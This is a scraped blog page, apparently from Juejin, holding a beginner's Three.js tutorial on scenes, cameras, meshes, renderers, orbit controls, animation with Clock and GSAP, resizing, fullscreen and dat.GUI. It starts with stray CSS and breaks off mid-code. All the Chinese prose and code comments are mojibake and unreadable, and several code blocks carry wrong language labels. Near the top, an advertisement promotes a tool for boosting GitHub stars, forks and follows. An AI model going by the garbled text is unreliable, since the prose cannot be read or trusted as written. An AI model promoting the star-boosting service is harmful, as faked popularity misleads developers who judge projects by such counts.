thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å½“ä½ åœ¨ä¼šè®®å®¤é‡Œä¸ºéœ€æ±‚ç»†èŠ‚äº‰è®ºä¸ä¼‘æ—¶ï¼Œæ™ºæ…§å·¥å‚çš„æ•°å­—å­ªç”Ÿæ­£åŒæ­¥ç€æ¯ä¸€æ¡äº§çº¿çš„å®æ—¶è„‰æï¼›å½“ä½ å¯¹ç€äºŒç»´å¹³é¢å›¾è„‘è¡¥ç©ºé—´å¸ƒå±€æ—¶ï¼Œæ™ºæ…§å°åŒºçš„ä¸‰ç»´æ¨¡å‹å·²åœ¨è™šæ‹Ÿä¸–ç•Œç²¾å‡†å¤åˆ»æ¯ä¸€æ‰‡çª—çš„é‡‡å…‰è§’åº¦ï¼›å½“ä½ åœ¨ CAD é‡Œåå¤è°ƒæ•´å‚æ•°æ—¶ï¼Œæ•°å­—å­ªç”ŸåŸå¸‚çš„äº¤é€šæµæ­£å®æ—¶æ˜ å°„æ¯è¾†è½¦çš„è¡Œé©¶è½¨è¿¹ã€‚</p>
<h4 data-id="heading-0">Taimili è‰¾ç±³è‰ ( ä¸€æ¬¾ä¸“ä¸šçš„ GitHub star ç®¡ç†å’Œgithub åŠ æ˜Ÿæ¶¨æ˜Ÿå·¥å…·<a href="https://link.juejin.cn?target=taimili.com" title="https://link.juejin.cn?target=taimili.com" target="_blank">taimili.com</a> )</h4>
<p>è‰¾ç±³è‰ æ˜¯ä¸€æ¬¾ä¼˜é›…ä¾¿æ·çš„Â GitHub star ç®¡ç†å’Œgithub åŠ æ˜Ÿæ¶¨æ˜Ÿå·¥å…·ï¼ŒåŸºäº PHP &amp; javascript æ„å»ºï¼Œ èƒ½å¯¹github å¾— star fork follow watch ç®¡ç†å’Œæå‡ï¼Œæœ€é€‚åˆgithub çš„æ·±åº¦ç”¨æˆ·</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d063ea140bec4310b6916716fa297407~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5rqQ5LmL55y8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533940&amp;x-signature=59gqNo3npj2aY95XIUmP%2BgSDeo8%3D" alt="WX20251021-210346@2x.png" loading="lazy"/></p>
<h2 data-id="heading-1"/>
<p>ä½œè€…ï¼šå¼€æºä¹‹çœ¼<br/>
é“¾æ¥ï¼š<a href="https://juejin.cn/post/7592822714068484147" target="_blank" title="https://juejin.cn/post/7592822714068484147">juejin.cn/post/759282â€¦</a><br/>
æ¥æºï¼šç¨€åœŸæ˜é‡‘<br/>
è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚
ä»æœºæ¢°è‡‚çš„ 3D ä»¿çœŸé¢„æ¼”åä¸‡æ¬¡é›¶è¯¯å·®è¿åŠ¨è·¯å¾„ï¼Œåˆ°å¯äº¤äº’ 3D å¼•æ“è®©å®¢æˆ·ç›´è§‚æ‹†è§£æ¯ä¸€ä¸ªé½¿è½®ï¼›ä» AR åŠ¨æ€æŒ‡å¼•è¦†ç›–æ‰€æœ‰å”®åæ•…éšœç‚¹ï¼Œåˆ° VR æ¼«æ¸¸è®©ä¸šä¸»æå‰ "æ¨å¼€" è®¾è®¡çš„é—¨çª—ï¼›ä»å…‰å½±å¼•æ“ç²¾å‡†è®¡ç®—åˆå 3 ç‚¹çš„æ¸©æŸ”æŠ˜å°„ï¼Œåˆ°æè´¨å‚æ•°çš„å®æ—¶å¯è§†åŒ–è°ƒæ•´ â€”â€”Web3D æ­£åœ¨é‡æ„æˆ‘ä»¬ä¸æ•°å­—ä¸–ç•Œçš„äº¤äº’æ–¹å¼ã€‚</p>
<p>å¯¹å‰ç«¯å¼€å‘è€…è€Œè¨€ï¼Œä» React è½¬å‘ Web3D ä»æ¥ä¸æ˜¯æ¢æ¡èµ›é“ï¼Œè€Œæ˜¯æ‰“å¼€å…¨æ–°ç»´åº¦ã€‚æ­£å¦‚éŸ©è€å¸ˆæ‰€è¯´ï¼šå†ç‰›çš„ç¨‹åºå‘˜éƒ½æ˜¯ä»å°ç™½èµ·æ­¥ï¼Œæ—¢ç„¶é€‰æ‹©å‡ºå‘ï¼Œä¾¿å…¨å¿ƒæŠ•å…¥æ·±è€•æŠ€æœ¯ã€‚ä¸‹é¢è¿™ä»½ Three.js å…¥é—¨æŒ‡å—ï¼Œå¸¦ä½ å¿«é€Ÿè¸å…¥ä¸‰ç»´å¼€å‘çš„å¤§é—¨ã€‚</p>
<h2 data-id="heading-2">æ ¸å¿ƒå·¥å…·ä¸æ–‡æ¡£</h2>
<p>Three.js ä½œä¸º Web3D å¼€å‘çš„æ ¸å¿ƒå·¥å…·ï¼Œå…¶å®˜æ–¹æ–‡æ¡£æ”¯æŒä¸­æ–‡åˆ‡æ¢ï¼Œæ‰€æœ‰ API éƒ½èƒ½åœ¨æ–‡æ¡£ä¸­å¿«é€Ÿæ£€ç´¢ã€‚åªéœ€æŒæ¡åœºæ™¯ã€ç›¸æœºã€ç‰©ä½“ã€æ¸²æŸ“å™¨å››å¤§åŸºç¡€ç»„ä»¶ï¼Œå°±èƒ½æ­å»ºèµ·ç¬¬ä¸€ä¸ª 3D åº”ç”¨ã€‚</p>
<h2 data-id="heading-3">åŸºç¡€æ ¸å¿ƒï¼šæ­å»ºä½ çš„ç¬¬ä¸€ä¸ª 3D åœºæ™¯</h2>
<h3 data-id="heading-4">1. åœºæ™¯ï¼ˆSceneï¼‰</h3>
<p>åœºæ™¯æ˜¯ Three.js çš„æ ¸å¿ƒå®¹å™¨ï¼Œç›¸å½“äº 3D ä¸–ç•Œçš„ "èˆå°"â€”â€” ç”¨äºæ”¾ç½®ç‰©ä½“ã€ç¯å…‰å’Œç›¸æœºï¼Œæ˜¯æ‰€æœ‰å¯è§†åŒ–å…ƒç´ çš„æ‰¿è½½åŸºç¡€ã€‚</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"three"</span>;

<span class="hljs-comment">// åˆ›å»º3Dåœºæ™¯</span>
<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
</code></pre>
<h3 data-id="heading-5">2. ç›¸æœºï¼ˆCameraï¼‰</h3>
<p>ç›¸æœºå†³å®šäº†æˆ‘ä»¬è§‚å¯Ÿ 3D ä¸–ç•Œçš„è§†è§’ï¼Œå°±åƒäººçš„çœ¼ç›ã€‚å¸¸ç”¨çš„é€è§†ç›¸æœºï¼ˆPerspectiveCameraï¼‰æ¨¡æ‹Ÿäººçœ¼æˆåƒåŸç†ï¼Œé€šè¿‡å››ä¸ªå‚æ•°å®šä¹‰è§‚å¯ŸèŒƒå›´ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// åˆ›å»ºé€è§†ç›¸æœº</span>
<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> THREE.PerspectiveCamera(
  <span class="hljs-number">75</span>, <span class="hljs-comment">// è§†é‡è§’åº¦ï¼ˆå•ä½ï¼šåº¦ï¼‰</span>
  <span class="hljs-built_in">window</span>.innerWidth / <span class="hljs-built_in">window</span>.innerHeight, <span class="hljs-comment">// å®½é«˜æ¯”ï¼ˆä¸çª—å£ä¿æŒä¸€è‡´ï¼‰</span>
  <span class="hljs-number">0.1</span>, <span class="hljs-comment">// è¿‘æˆªé¢ï¼ˆæœ€è¿‘å¯è§è·ç¦»ï¼‰</span>
  <span class="hljs-number">1000</span> <span class="hljs-comment">// è¿œæˆªé¢ï¼ˆæœ€è¿œå¯è§è·ç¦»ï¼‰</span>
);

<span class="hljs-comment">// è®¾ç½®ç›¸æœºä½ç½®ï¼ˆx, y, zè½´åæ ‡ï¼‰</span>
camera.position.<span class="hljs-keyword">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
<span class="hljs-comment">// å°†ç›¸æœºæ·»åŠ åˆ°åœºæ™¯</span>
scene.add(camera);
</code></pre>
<h3 data-id="heading-6">3. ç‰©ä½“ï¼ˆCubeï¼‰</h3>
<p>3D ç‰©ä½“ç”±å‡ ä½•ä½“ï¼ˆGeometryï¼‰å’Œæè´¨ï¼ˆMaterialï¼‰ç»„æˆã€‚ä»¥ç«‹æ–¹ä½“ä¸ºä¾‹ï¼Œå…ˆå®šä¹‰å½¢çŠ¶å°ºå¯¸ï¼Œå†è®¾ç½®å¤–è§‚æ ·å¼ï¼Œæœ€åç»„åˆæˆå¯æ¸²æŸ“çš„ç½‘æ ¼å¯¹è±¡ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. åˆ›å»ºå‡ ä½•ä½“ï¼ˆé•¿ã€å®½ã€é«˜å‡ä¸º1ï¼‰</span>
<span class="hljs-keyword">const</span> cubeGeometry = <span class="hljs-keyword">new</span> THREE.BoxGeometry(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);
<span class="hljs-comment">// 2. åˆ›å»ºæè´¨ï¼ˆåŸºç¡€ç½‘æ ¼æè´¨ï¼Œé»„è‰²ï¼‰</span>
<span class="hljs-keyword">const</span> cubeMaterial = <span class="hljs-keyword">new</span> THREE.MeshBasicMaterial({ color: <span class="hljs-number">0xffff00</span> });
<span class="hljs-comment">// 3. ç»„åˆå‡ ä½•ä½“ä¸æè´¨ï¼Œåˆ›å»ºç«‹æ–¹ä½“å¯¹è±¡</span>
<span class="hljs-keyword">const</span> cube = <span class="hljs-keyword">new</span> THREE.Mesh(cubeGeometry, cubeMaterial);
<span class="hljs-comment">// 4. å°†ç«‹æ–¹ä½“æ·»åŠ åˆ°åœºæ™¯</span>
scene.<span class="hljs-keyword">add</span>(cube);
</code></pre>
<h3 data-id="heading-7">4. æ¸²æŸ“å™¨ï¼ˆRendererï¼‰</h3>
<p>æ¸²æŸ“å™¨è´Ÿè´£å°†åœºæ™¯å’Œç›¸æœºçš„ä¿¡æ¯æ¸²æŸ“åˆ°é¡µé¢ä¸Šï¼Œæœ¬è´¨æ˜¯åˆ›å»ºä¸€ä¸ª Canvas å…ƒç´ å¹¶æ’å…¥åˆ° DOM ä¸­ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åˆå§‹åŒ–WebGLæ¸²æŸ“å™¨</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>();
<span class="hljs-comment">// è®¾ç½®æ¸²æŸ“å°ºå¯¸ï¼ˆä¸çª—å£å¤§å°ä¸€è‡´ï¼‰</span>
renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
<span class="hljs-comment">// å°†æ¸²æŸ“ç»“æœï¼ˆCanvasï¼‰æ·»åŠ åˆ°é¡µé¢body</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// æ‰§è¡Œæ¸²æŸ“ï¼šé€šè¿‡ç›¸æœºæ‹æ‘„åœºæ™¯å¹¶å‘ˆç°</span>
renderer.<span class="hljs-title function_">render</span>(scene, camera);
</code></pre>
<p>æ­¤æ—¶ä½ ä¼šçœ‹åˆ°ä¸€ä¸ªå¹³é¢é»„è‰²æ–¹å— â€”â€” è¦å®ç°çœŸæ­£çš„ 3D äº¤äº’ï¼Œè¿˜éœ€è¦æ·»åŠ æ§åˆ¶å™¨å’Œè¾…åŠ©å·¥å…·ã€‚</p>
<h2 data-id="heading-8">è¿›é˜¶äº¤äº’ï¼šè®© 3D ä¸–ç•Œ "æ´»" èµ·æ¥</h2>
<h3 data-id="heading-9">1. è½¨é“æ§åˆ¶å™¨ï¼ˆOrbitControlsï¼‰</h3>
<p>æ·»åŠ è½¨é“æ§åˆ¶å™¨åï¼Œå¯é€šè¿‡é¼ æ ‡æ‹–æ‹½æ—‹è½¬è§†è§’ã€æ»šè½®ç¼©æ”¾ï¼Œå®ç°ç¯ç»•è§‚å¯Ÿæ•ˆæœï¼Œè®©å¹³é¢å›¾å½¢ç§’å˜ 3D ç‰©ä½“ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// å¯¼å…¥è½¨é“æ§åˆ¶å™¨</span>
import { OrbitControls } from "three/examples/jsm/controls/OrbitControls";

<span class="hljs-comment">// åˆ›å»ºæ§åˆ¶å™¨ï¼ˆç»‘å®šç›¸æœºå’Œæ¸²æŸ“ç”»å¸ƒï¼‰</span>
const controls = new <span class="hljs-built_in">OrbitControls</span>(camera, renderer.domElement);
<span class="hljs-comment">// å¼€å¯é˜»å°¼æ•ˆæœï¼Œè®©æ“ä½œæ›´å¹³æ»‘</span>
controls<span class="hljs-selector-class">.enableDamping</span> = true;

<span class="hljs-comment">// å®šä¹‰æ¸²æŸ“å¾ªç¯å‡½æ•°</span>
function <span class="hljs-built_in">render</span>() {
  <span class="hljs-comment">// æ›´æ–°æ§åˆ¶å™¨çŠ¶æ€ï¼ˆç¡®ä¿é˜»å°¼æ•ˆæœç”Ÿæ•ˆï¼‰</span>
  controls<span class="hljs-selector-class">.update</span>();
  <span class="hljs-comment">// é‡å¤æ¸²æŸ“ä¸‹ä¸€å¸§</span>
  renderer<span class="hljs-selector-class">.render</span>(scene, camera);
  <span class="hljs-built_in">requestAnimationFrame</span>(render);
}

<span class="hljs-comment">// å¯åŠ¨æ¸²æŸ“å¾ªç¯</span>
<span class="hljs-built_in">render</span>();
</code></pre>
<h3 data-id="heading-10">2. åæ ‡è½´è¾…åŠ©å™¨</h3>
<p>æ·»åŠ åæ ‡è½´è¾…åŠ©å™¨å¯ç›´è§‚çœ‹åˆ° 3D åæ ‡ç³»ï¼ˆçº¢è‰² X è½´ã€ç»¿è‰² Y è½´ã€è“è‰² Z è½´ï¼‰ï¼Œæ–¹ä¾¿è°ƒè¯•ç‰©ä½“ä½ç½®ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// åˆ›å»ºåæ ‡è½´è¾…åŠ©å™¨ï¼ˆè½´é•¿ä¸º5ï¼‰</span>
<span class="hljs-keyword">const</span> axesHelper = <span class="hljs-keyword">new</span> THREE.AxesHelper(<span class="hljs-number">5</span>);
<span class="hljs-comment">// æ·»åŠ åˆ°åœºæ™¯</span>
scene.<span class="hljs-keyword">add</span>(axesHelper);
</code></pre>
<h3 data-id="heading-11">3. ç‰©ä½“å˜æ¢ï¼šç§»åŠ¨ã€ç¼©æ”¾ä¸æ—‹è½¬</h3>
<p>é€šè¿‡ä¿®æ”¹ç‰©ä½“çš„ positionã€scaleã€rotation å±æ€§ï¼Œå¯å®ç°å„ç±»å˜æ¢æ•ˆæœï¼Œæ”¯æŒå•ç‹¬è®¾ç½®æˆ–æ‰¹é‡èµ‹å€¼ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini">// 1. ç§»åŠ¨ï¼ˆxè½´ç§»åŠ¨3ä¸ªå•ä½ï¼‰
<span class="hljs-attr">cube.position.x</span> = <span class="hljs-number">3</span><span class="hljs-comment">;</span>
// æ‰¹é‡è®¾ç½®ä½ç½®ï¼ˆx, y, zï¼‰
cube.position.set(3, 1, 2)<span class="hljs-comment">;</span>

// 2. ç¼©æ”¾ï¼ˆxè½´3å€ã€yè½´2å€ã€zè½´1å€ï¼‰
cube.scale.set(3, 2, 1)<span class="hljs-comment">;</span>
// å•ç‹¬è®¾ç½®xè½´ç¼©æ”¾
<span class="hljs-attr">cube.scale.x</span> = <span class="hljs-number">4</span><span class="hljs-comment">;</span>

// 3. æ—‹è½¬ï¼ˆxè½´æ—‹è½¬45åº¦ï¼Œå¼§åº¦åˆ¶ï¼šMath.PI/4ï¼‰
<span class="hljs-attr">cube.rotation.x</span> = Math.PI / <span class="hljs-number">4</span><span class="hljs-comment">;</span>
// æ‰¹é‡è®¾ç½®æ—‹è½¬ï¼ˆx, y, z, é¡ºåºï¼‰
cube.rotation.set(Math.PI/4, 0, 0, "XZY")<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-12">4. åŠ¨ç”»å®ç°ï¼šè®©ç‰©ä½“åŠ¨èµ·æ¥</h3>
<h4 data-id="heading-13">æ–¹å¼ 1ï¼šrequestAnimationFrame æ‰‹åŠ¨æ§åˆ¶</h4>
<p>åˆ©ç”¨æµè§ˆå™¨å¸§å¾ªç¯ APIï¼Œå®ç°åŒ€é€Ÿè¿åŠ¨æˆ–å‘¨æœŸæ€§åŠ¨ç”»ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">render</span>(time) {
  <span class="hljs-comment">// timeä¸ºæ—¶é—´æˆ³ï¼Œè½¬æ¢ä¸ºç§’å¹¶å–ä½™ï¼ˆå®ç°0-5ç§’å¾ªç¯ï¼‰</span>
  let t = (time / <span class="hljs-number">1000</span>) % <span class="hljs-number">5</span>;
  <span class="hljs-comment">// xè½´éšæ—¶é—´ç§»åŠ¨ï¼ˆ0-5å•ä½å¾ªç¯ï¼‰</span>
  cube<span class="hljs-selector-class">.position</span><span class="hljs-selector-class">.x</span> = t;
  <span class="hljs-comment">// æŒç»­æ¸²æŸ“</span>
  renderer<span class="hljs-selector-class">.render</span>(scene, camera);
  <span class="hljs-built_in">requestAnimationFrame</span>(render);
}
<span class="hljs-built_in">render</span>();
</code></pre>
<h4 data-id="heading-14">æ–¹å¼ 2ï¼šClock æ—¶é’Ÿå·¥å…·</h4>
<p>Three.js å†…ç½® Clock å·¥å…·ï¼Œå¯ç²¾å‡†è·å–æ—¶é—´é—´éš”ï¼Œé¿å…æ‰‹åŠ¨è®¡ç®—è¯¯å·®ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini">// åˆ›å»ºæ—¶é’Ÿå¯¹è±¡
const <span class="hljs-attr">clock</span> = new THREE.Clock()<span class="hljs-comment">;</span>

function render() {
  // è·å–æ—¶é’Ÿè¿è¡Œæ€»æ—¶é•¿
  let <span class="hljs-attr">time</span> = clock.getElapsedTime()<span class="hljs-comment">;</span>
  // è·å–ä¸¤æ¬¡æ¸²æŸ“çš„æ—¶é—´é—´éš”ï¼ˆçº¦16ms/å¸§ï¼‰
  let <span class="hljs-attr">deltaTime</span> = clock.getDelta()<span class="hljs-comment">;</span>
  
  let <span class="hljs-attr">t</span> = time % <span class="hljs-number">5</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">cube.position.x</span> = t<span class="hljs-comment">;</span>
  
  renderer.render(scene, camera)<span class="hljs-comment">;</span>
  requestAnimationFrame(render)<span class="hljs-comment">;</span>
}
render()<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-15">æ–¹å¼ 3ï¼šGSAP åŠ¨ç”»åº“ï¼ˆæ¨èï¼‰</h4>
<p>GSAPï¼ˆGreenSock Animation Platformï¼‰æä¾›æ›´å¼ºå¤§çš„åŠ¨ç”»æ§åˆ¶ï¼Œæ”¯æŒç¼“åŠ¨æ•ˆæœã€å¾ªç¯ã€å»¶è¿Ÿç­‰åŠŸèƒ½ï¼Œé›†æˆç®€å•é«˜æ•ˆï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯¼å…¥GSAPåº“</span>
<span class="hljs-keyword">import</span> gsap <span class="hljs-keyword">from</span> <span class="hljs-string">"gsap"</span>;

<span class="hljs-comment">// 1. ä½ç½®åŠ¨ç”»ï¼šxè½´ä»0åˆ°5ï¼Œ5ç§’å®Œæˆï¼Œå¾€è¿”å¾ªç¯</span>
<span class="hljs-keyword">const</span> animate1 = gsap.<span class="hljs-title function_">to</span>(cube.<span class="hljs-property">position</span>, {
  <span class="hljs-attr">x</span>: <span class="hljs-number">5</span>,
  <span class="hljs-attr">duration</span>: <span class="hljs-number">5</span>,
  <span class="hljs-attr">ease</span>: <span class="hljs-string">"power1.inOut"</span>, <span class="hljs-comment">// ç¼“åŠ¨æ•ˆæœ</span>
  <span class="hljs-attr">repeat</span>: -<span class="hljs-number">1</span>, <span class="hljs-comment">// æ— é™å¾ªç¯ï¼ˆ-1è¡¨ç¤ºå¾ªç¯ï¼‰</span>
  <span class="hljs-attr">yoyo</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¾€è¿”è¿åŠ¨</span>
  <span class="hljs-attr">delay</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// å»¶è¿Ÿ2ç§’å¯åŠ¨</span>
  <span class="hljs-attr">onStart</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŠ¨ç”»å¼€å§‹"</span>),
  <span class="hljs-attr">onComplete</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŠ¨ç”»å®Œæˆ"</span>)
});

<span class="hljs-comment">// 2. æ—‹è½¬åŠ¨ç”»ï¼šxè½´æ—‹è½¬360åº¦ï¼ˆ2Ï€å¼§åº¦ï¼‰</span>
gsap.<span class="hljs-title function_">to</span>(cube.<span class="hljs-property">rotation</span>, { <span class="hljs-attr">x</span>: <span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>, <span class="hljs-attr">duration</span>: <span class="hljs-number">5</span> });

<span class="hljs-comment">// åŒå‡»æš‚åœ/æ¢å¤åŠ¨ç”»</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"dblclick"</span>, <span class="hljs-function">() =&gt;</span> {
  animate1.<span class="hljs-title function_">isActive</span>() ? animate1.<span class="hljs-title function_">pause</span>() : animate1.<span class="hljs-title function_">resume</span>();
});

<span class="hljs-comment">// ä¿æŒæ¸²æŸ“å¾ªç¯</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
  <span class="hljs-title function_">requestAnimationFrame</span>(render);
}
<span class="hljs-title function_">render</span>();
</code></pre>
<h2 data-id="heading-16">å®ç”¨åŠŸèƒ½ï¼šæå‡å¼€å‘ä½“éªŒ</h2>
<h3 data-id="heading-17">1. çª—å£è‡ªé€‚åº”</h3>
<p>ç›‘å¬çª—å£å°ºå¯¸å˜åŒ–ï¼Œå®æ—¶æ›´æ–°ç›¸æœºå’Œæ¸²æŸ“å™¨è®¾ç½®ï¼Œé¿å…ç”»é¢æ‹‰ä¼¸ï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"resize"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// æ›´æ–°ç›¸æœºå®½é«˜æ¯”</span>
  camera.<span class="hljs-property">aspect</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;
  <span class="hljs-comment">// åˆ·æ–°ç›¸æœºæŠ•å½±çŸ©é˜µ</span>
  camera.<span class="hljs-title function_">updateProjectionMatrix</span>();
  <span class="hljs-comment">// æ›´æ–°æ¸²æŸ“å™¨å°ºå¯¸</span>
  renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
  <span class="hljs-comment">// è®¾ç½®åƒç´ æ¯”ï¼ˆé€‚é…é«˜æ¸…å±å¹•ï¼‰</span>
  renderer.<span class="hljs-title function_">setPixelRatio</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>);
});
</code></pre>
<h3 data-id="heading-18">2. å…¨å±åˆ‡æ¢</h3>
<p>åŒå‡»ç”»å¸ƒå®ç°å…¨å± / é€€å‡ºå…¨å±åŠŸèƒ½ï¼Œæå‡æ²‰æµ¸å¼ä½“éªŒï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"dblclick"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> fullScreenElement = <span class="hljs-variable language_">document</span>.<span class="hljs-property">fullscreenElement</span>;
  <span class="hljs-keyword">if</span> (!fullScreenElement) {
    <span class="hljs-comment">// è¿›å…¥å…¨å±ï¼ˆæ¸²æŸ“ç”»å¸ƒå…ƒç´ ï¼‰</span>
    renderer.<span class="hljs-property">domElement</span>.<span class="hljs-title function_">requestFullscreen</span>();
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// é€€å‡ºå…¨å±</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">exitFullscreen</span>();
  }
});
</code></pre>
<h3 data-id="heading-19">3. å›¾å½¢åŒ–è°ƒè¯•ï¼ˆdat.GUIï¼‰</h3>
<p>é€šè¿‡ dat.GUI åˆ›å»ºå¯è§†åŒ–æ§åˆ¶é¢æ¿ï¼Œå®æ—¶è°ƒæ•´ç‰©ä½“å‚æ•°ï¼Œæ— éœ€ä¿®æ”¹ä»£ç é‡æ–°è¿è¡Œï¼š</p>
<p>javascript</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// å¯¼å…¥dat.GUI</span>
import * <span class="hljs-keyword">as</span> dat <span class="hljs-keyword">from</span> <span class="hljs-string">"dat.gui"</span>;

<span class="hljs-comment">// åˆ›å»ºGUIå®ä¾‹</span>
<span class="hljs-keyword">const</span> gui = <span class="hljs-keyword">new</span> dat.GUI();

<span class="hljs-comment">// 1. æ§åˆ¶xè½´ä½ç½®ï¼ˆ0-5ï¼Œæ­¥é•¿0.01ï¼‰</span>
gui.<span class="hljs-keyword">add</span>(cube.position, <span class="hljs-string">"x"</span>)
  .min(<span class="hljs-number">0</span>)
  .max(<span class="hljs-number">5</span>)
  .step(<span class="hljs-number">0.01</span>)
  .name(<span class="hljs-string">"ç§»åŠ¨Xè½´"</span>)
  .onChange(<span class="hljs-keyword">value</span> =&gt; console.log(<span class="hljs-string">"Xè½´ä½ç½®ï¼š"</span>, <span class="hljs-keyword">value</span>));

<span class="hljs-comment">// 2. æ§åˆ¶ç‰©ä½“é¢œè‰²</span>
<span class="hljs-keyword">const</span> <span class="hljs-keyword">params</span> = {
  color: <span class="hljs-string">"#ffff00"</span>,
